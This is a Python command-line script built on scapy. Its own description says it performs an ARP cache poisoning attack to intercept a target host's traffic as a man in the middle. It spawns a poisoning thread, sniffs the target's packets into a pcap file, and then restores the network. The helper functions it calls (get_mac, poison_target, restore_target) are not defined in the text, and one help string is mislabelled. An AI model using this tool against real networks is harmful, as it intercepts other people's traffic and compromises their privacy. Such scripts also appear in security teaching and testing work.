#!/usr/bin/env python3

import argparse

from scapy.all import *
from scapy.layers.l2 import ARP, Ether

parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('-i', '--interface', type=str, dest='interface', default='eth0',
                    help='interface to use')
parser.add_argument('-g', '--gateway', type=str, dest='gateway', help='gateway address')
parser.add_argument('-t', '--target', type=str, dest='target', help='interface to use')
parser.add_argument('-c', '--count', type=int, dest='count', default=1000,
                    help='number of packets to send, 0 means send forever')
parser.add_argument('-f', '--filename', type=str, dest='filename', default='arper.pcap', help='filename to save pcap')

parser.description = """\
This is a Python program to perform an arp cache poisoning attack, 
and then intercept traffic as MITM (Man In The Middle).
"""
args = parser.parse_args()



def main():
    print(f'Setting up to sniff on interface: {args.interface}')

    # gather real mac addresses via ARP
    print(f'Getting MAC addr for gateway: {args.gateway}')
    gateway_mac = get_mac(args.gateway)
    if gateway_mac is None:
        print(f'Failed to get MAC addr for gateway: {args.gateway}')
        sys.exit(1)
    else:
        print(f'Gateway: {args.gateway} is at: {gateway_mac}')

    print(f'Getting MAC addr for target: {args.target}')
    target_mac = get_mac(args.target)
    if target_mac is None:
        print(f'Failed to get MAC addr for target: {args.target}')
        sys.exit(1)
    else:
        print(f'Target: {args.target} is at: {target_mac}')

    # spawn thread to run poison part of attack (send malicious gratuitous ARP to poison ARP cache with OUR mac)
    poison_thread = threading.Thread(target=poison_target, args=(args.gateway, gateway_mac, args.target, target_mac),
                                     daemon=True)
    poison_thread.start()

    try:
        print(f'Starting sniffer for {args.count} packets')

        bpf_filter = f'ip host {args.target}'
        packets = sniff(filter=bpf_filter, count=args.count, iface=args.interface)

        # write out a pcap
        wrpcap(args.filename, packets)

        # restore the network
        restore_target(args.gateway, gateway_mac, args.target, target_mac)
        print(f'Completed attack on:  {args.target} results stored in: {args.filename}')

    except KeyboardInterrupt:
        restore_target(args.gateway, gateway_mac, args.target, target_mac)
        sys.exit(0)


if __name__ == '__main__':
    main()
